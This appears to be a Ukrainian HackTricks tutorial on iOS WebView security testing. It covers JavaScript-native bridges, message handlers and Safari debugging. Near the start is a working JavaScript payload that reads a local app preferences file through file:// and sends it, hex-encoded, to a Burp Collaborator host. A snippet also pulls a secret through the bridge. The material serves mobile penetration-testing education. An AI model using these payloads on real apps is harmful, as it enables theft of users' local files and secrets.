–í –∫—ñ–Ω—Ü–µ–≤–æ–º—É –ø—ñ–¥—Å—É–º–∫—É, –ø—Ä–∏–∫–ª–∞–¥ JavaScript-–Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —Å–ø—Ä—è–º–æ–≤–∞–Ω–æ–≥–æ –Ω–∞ –≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π —Ä–∏–∑–∏–∫ –±–µ–∑–ø–µ–∫–∏, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–º–∏ WebViews. –¶–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ–¥—É—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É —É —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–¥–∞—á–µ—é —ó—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä, –ø—ñ–¥–∫—Ä–µ—Å–ª—é—é—á–∏ –≤–∞–∂–ª–∏–≤—ñ—Å—Ç—å —Å—É–≤–æ—Ä–∏—Ö –∑–∞—Ö–æ–¥—ñ–≤ –±–µ–∑–ø–µ–∫–∏ –≤ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó WebView.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## –í–±—É–¥–æ–≤–∞–Ω—ñ –º–µ—Ç–æ–¥–∏, —è–∫—ñ –≤–∏–∫—Ä–∏–≤–∞—é—Ç—å—Å—è —á–µ—Ä–µ–∑ WebViews

## –†–æ–∑—É–º—ñ–Ω–Ω—è –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤ WebView –≤ iOS

–ü–æ—á–∏–Ω–∞—é—á–∏ –∑ iOS 7, Apple –Ω–∞–¥–∞–ª–∞ API –¥–ª—è **–∑–≤'—è–∑–∫—É –º—ñ–∂ JavaScript —É WebView —Ç–∞ –≤–±—É–¥–æ–≤–∞–Ω–∏–º–∏** –æ–±'—î–∫—Ç–∞–º–∏ Swift –∞–±–æ Objective-C. –¶—è —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –¥–≤–æ—Ö –º–µ—Ç–æ–¥—ñ–≤:

- **JSContext**: JavaScript-—Ñ—É–Ω–∫—Ü—ñ—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è, –∫–æ–ª–∏ –±–ª–æ–∫ Swift –∞–±–æ Objective-C –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–æ–º —É `JSContext`. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –±–µ–∑—à–æ–≤–Ω—É —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—é —Ç–∞ –∑–≤'—è–∑–æ–∫ –º—ñ–∂ JavaScript —Ç–∞ –≤–±—É–¥–æ–≤–∞–Ω–∏–º –∫–æ–¥–æ–º.
- **JSExport Protocol**: –®–ª—è—Ö–æ–º —É—Å–ø–∞–¥–∫—É–≤–∞–Ω–Ω—è –ø—Ä–æ—Ç–æ–∫–æ–ª—É `JSExport` –º–æ–∂–Ω–∞ –≤–∏–∫—Ä–∏—Ç–∏ –≤–±—É–¥–æ–≤–∞–Ω—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, –µ–∫–∑–µ–º–ø–ª—è—Ä–Ω—ñ –º–µ—Ç–æ–¥–∏ —Ç–∞ –º–µ—Ç–æ–¥–∏ –∫–ª–∞—Å—É –¥–ª—è JavaScript. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –±—É–¥—å-—è–∫—ñ –∑–º—ñ–Ω–∏, –≤–Ω–µ—Å–µ–Ω—ñ –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ JavaScript, –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è –≤ –≤–±—É–¥–æ–≤–∞–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, —ñ –Ω–∞–≤–ø–∞–∫–∏. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ –Ω–µ –≤–∏–ø–∞–¥–∫–æ–≤–æ –Ω–µ –≤–∏–∫—Ä–∏–≤–∞—é—Ç—å—Å—è —á–µ—Ä–µ–∑ —Ü–µ–π –º–µ—Ç–æ–¥.

### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ `JSContext` –≤ Objective-C

–£ Objective-C, `JSContext` –¥–ª—è `UIWebView` –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Ä—è–¥–∫–∞ –∫–æ–¥—É:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### –ó–≤'—è–∑–æ–∫ –∑ `WKWebView`

–î–ª—è `WKWebView` –ø—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ `JSContext` –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π. –ó–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø–µ—Ä–µ–¥–∞—á–∞ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—é `postMessage`, —â–æ –¥–æ–∑–≤–æ–ª—è—î JavaScript –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –Ω–∞—Ç–∏–≤–Ω–∏–º –∫–æ–¥–æ–º. –û–±—Ä–æ–±–Ω–∏–∫–∏ –¥–ª—è —Ü–∏—Ö –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –Ω–∞–ª–∞—à—Ç–æ–≤—É—é—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, —â–æ –¥–æ–∑–≤–æ–ª—è—î JavaScript –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –Ω–∞—Ç–∏–≤–Ω–∏–º –¥–æ–¥–∞—Ç–∫–æ–º –±–µ–∑–ø–µ—á–Ω–æ:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### –í–∑–∞—î–º–æ–¥—ñ—è —Ç–∞ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è

JavaScript –º–æ–∂–µ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–º —Ä—ñ–≤–Ω–µ–º, –≤–∏–∑–Ω–∞—á–∞—é—á–∏ –æ–±—Ä–æ–±–Ω–∏–∫ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —Å–∫—Ä–∏–ø—Ç—É. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –æ–ø–µ—Ä–∞—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ –≤–∏–∫–ª–∏–∫ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —Ñ—É–Ω–∫—Ü—ñ–π –∑ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
–î–ª—è –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º –≤–∏–∫–ª–∏–∫—É –≤–±—É–¥–æ–≤–∞–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó, –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤–∏–∑–Ω–∞—á–∏—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É –≤ –º–µ–∂–∞—Ö HTML:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
–ù–∞—Ç–∏–≤–Ω–∞ —Å—Ç–æ—Ä–æ–Ω–∞ –æ–±—Ä–æ–±–ª—è—î –≤–∏–∫–ª–∏–∫ JavaScript, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –∫–ª–∞—Å—ñ `JavaScriptBridgeMessageHandler`, –¥–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –æ–ø–µ—Ä–∞—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ –º–Ω–æ–∂–µ–Ω–Ω—è —á–∏—Å–µ–ª, –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è —ñ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è –Ω–∞–∑–∞–¥ –¥–æ JavaScript –¥–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∞–±–æ –ø–æ–¥–∞–ª—å—à–æ—ó –æ–±—Ä–æ–±–∫–∏:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è iOS WebViews

(–ü–æ—Å—ñ–±–Ω–∏–∫ –Ω–∞ –æ—Å–Ω–æ–≤—ñ [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

–î–ª—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ –≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è –≤–µ–±-–∫–æ–Ω—Ç–µ–Ω—Ç—É –≤ –º–µ–∂–∞—Ö iOS webviews –ø–æ—Ç—Ä—ñ–±–Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞, —è–∫–∞ –≤–∫–ª—é—á–∞—î –≤ —Å–µ–±–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ Safari, –æ—Å–∫—ñ–ª—å–∫–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ –¥–æ `console.log()`, –Ω–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö Xcode. –û—Å—å —Å–ø—Ä–æ—â–µ–Ω–∏–π –ø–æ—Å—ñ–±–Ω–∏–∫, —è–∫–∏–π –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î –∫–ª—é—á–æ–≤—ñ –∫—Ä–æ–∫–∏ —Ç–∞ –≤–∏–º–æ–≥–∏:

- **–ü—ñ–¥–≥–æ—Ç–æ–≤–∫–∞ –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó iOS**: –Ü–Ω—Å–ø–µ–∫—Ç–æ—Ä –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫ Safari –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏–π –Ω–∞ –≤–∞—à–æ–º—É –ø—Ä–∏—Å—Ç—Ä–æ—ó iOS. –¶–µ —Ä–æ–±–∏—Ç—å—Å—è, –ø–µ—Ä–µ–π—à–æ–≤—à–∏ –¥–æ **–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è > Safari > –î–æ–¥–∞—Ç–∫–æ–≤–æ**, —Ç–∞ —É–≤—ñ–º–∫–Ω—É–≤—à–∏ _–Ü–Ω—Å–ø–µ–∫—Ç–æ—Ä –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫_.

- **–ü—ñ–¥–≥–æ—Ç–æ–≤–∫–∞ –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó macOS**: –ù–∞ –≤–∞—à–æ–º—É —Ä–æ–±–æ—á–æ–º—É –ø—Ä–∏—Å—Ç—Ä–æ—ó macOS –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —É–≤—ñ–º–∫–Ω—É—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ –≤ Safari. –ó–∞–ø—É—Å—Ç—ñ—Ç—å Safari, –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ **Safari > –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è > –î–æ–¥–∞—Ç–∫–æ–≤–æ**, —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å –æ–ø—Ü—ñ—é _–ü–æ–∫–∞–∑–∞—Ç–∏ –º–µ–Ω—é –†–æ–∑—Ä–æ–±–Ω–∏–∫_.

- **–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Ç–∞ –≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è**: –ü—ñ—Å–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≤–∞—à–æ–≥–æ –ø—Ä–∏—Å—Ç—Ä–æ—é iOS –¥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ macOS —Ç–∞ –∑–∞–ø—É—Å–∫—É –≤–∞—à–æ—ó –ø—Ä–æ–≥—Ä–∞–º–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ Safari –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó macOS, —â–æ–± –≤–∏–±—Ä–∞—Ç–∏ webview, —è–∫—É –≤–∏ —Ö–æ—á–µ—Ç–µ –≤—ñ–¥–ª–∞–≥–æ–¥–∂—É–≤–∞—Ç–∏. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ _–†–æ–∑—Ä–æ–±–∫–∞_ —É –º–µ–Ω—é Safari, –Ω–∞–≤–µ–¥—ñ—Ç—å –∫—É—Ä—Å–æ—Ä –Ω–∞ –Ω–∞–∑–≤—É –≤–∞—à–æ–≥–æ –ø—Ä–∏—Å—Ç—Ä–æ—é iOS, —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏ —Å–ø–∏—Å–æ–∫ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ webview, —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å –µ–∫–∑–µ–º–ø–ª—è—Ä, —è–∫–∏–π –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏. –î–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏ –≤—ñ–¥–∫—Ä–∏—î—Ç—å—Å—è –Ω–æ–≤–µ –≤—ñ–∫–Ω–æ –Ü–Ω—Å–ø–µ–∫—Ç–æ—Ä–∞ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫ Safari.

–ü—Ä–æ—Ç–µ —Å–ª—ñ–¥ –±—É—Ç–∏ —É–≤–∞–∂–Ω–∏–º –¥–æ –æ–±–º–µ–∂–µ–Ω—å:

- –î–ª—è –≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è –∑–∞ —Ü–∏–º –º–µ—Ç–æ–¥–æ–º –ø–æ—Ç—Ä—ñ–±–µ–Ω –ø—Ä–∏—Å—Ç—Ä—ñ–π macOS, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ Safari.
- –¢—ñ–ª—å–∫–∏ webviews —É –ø—Ä–æ–≥—Ä–∞–º–∞—Ö, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö –Ω–∞ –≤–∞—à –ø—Ä–∏—Å—Ç—Ä—ñ–π —á–µ—Ä–µ–∑ Xcode, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω—ñ. Webviews —É –¥–æ–¥–∞—Ç–∫–∞—Ö, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—Ö —á–µ—Ä–µ–∑ App Store –∞–±–æ Apple Configurator, –Ω–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω—ñ —Ü–∏–º —Å–ø–æ—Å–æ–±–æ–º.


## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
